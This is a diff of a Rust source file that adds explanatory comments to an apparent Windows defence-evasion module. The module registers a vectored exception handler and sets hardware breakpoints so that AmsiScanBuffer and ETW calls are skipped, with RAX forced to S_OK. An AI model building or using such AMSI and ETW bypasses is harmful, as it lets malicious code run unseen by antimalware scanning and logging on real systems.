@@ -17,6 +17,7 @@ use crate::debug;
 static VEH_REGISTERED: AtomicBool = AtomicBool::new(false);
 
 // Breakpoint addresses for DR0-DR3. The VEH handler checks the exception
+// Address aganist all registered slots
 static HWBP_ADDRS: [AtomicUsize; 4] = [
     AtomicUsize::new(0),
     AtomicUsize::new(0),
@@ -24,6 +25,11 @@ static HWBP_ADDRS: [AtomicUsize; 4] = [
     AtomicUsize::new(0),
 ];
 
+
+/**
+ * register the VEH handler if not already registered. 
+ * Returns true if the handler is active (either just registered or already was)
+ * */
 pub(crate) unsafe fn ensure_veh_registered() -> bool {
     unsafe {
         if VEH_REGISTERED.load(Ordering::SeqCst) {
@@ -53,6 +59,9 @@ pub(crate) unsafe fn ensure_veh_registered() -> bool {
     }
 }
 
+/**
+ * Unified VEH handler for all hardware breakpoint bypasses - When any registered function (AMSI, ETW) is called, the CPU fires a single step exception before the first instruction executes 
+ *  */
 unsafe extern "system" fn hwbp_exception_handler(excpetion_info: *mut ExceptionPointers) -> i32 {
     unsafe {
         let record = &*(*excpetion_info).exception_record;
@@ -83,6 +92,9 @@ unsafe extern "system" fn hwbp_exception_handler(excpetion_info: *mut ExceptionP
     }
 }
 
+/**
+ * Set a hardware breakpoint on the given DR slots 0-3 for specified address. This modifies the current thread debug registers via NtGet/SetContextThread
+ * */
 pub(crate) unsafe fn set_hardware_breakpint(slot: usize, target_addr: usize) -> bool {
     unsafe {
         if slot > 3 || target_addr == 0 {
@@ -153,6 +165,10 @@ pub(crate) unsafe fn set_hardware_breakpint(slot: usize, target_addr: usize) -> 
         true
     }
 }
+
+/**
+ * Use DR0 hardware breakpoint on AmsiScanBuffer, when called the CPU fires STATUS_SINGLE_STEP, our VEH hnadler sets RAX=S_OK and skips the function 
+ * */
 
 pub unsafe fn patch_amsi() -> bool {
     unsafe {
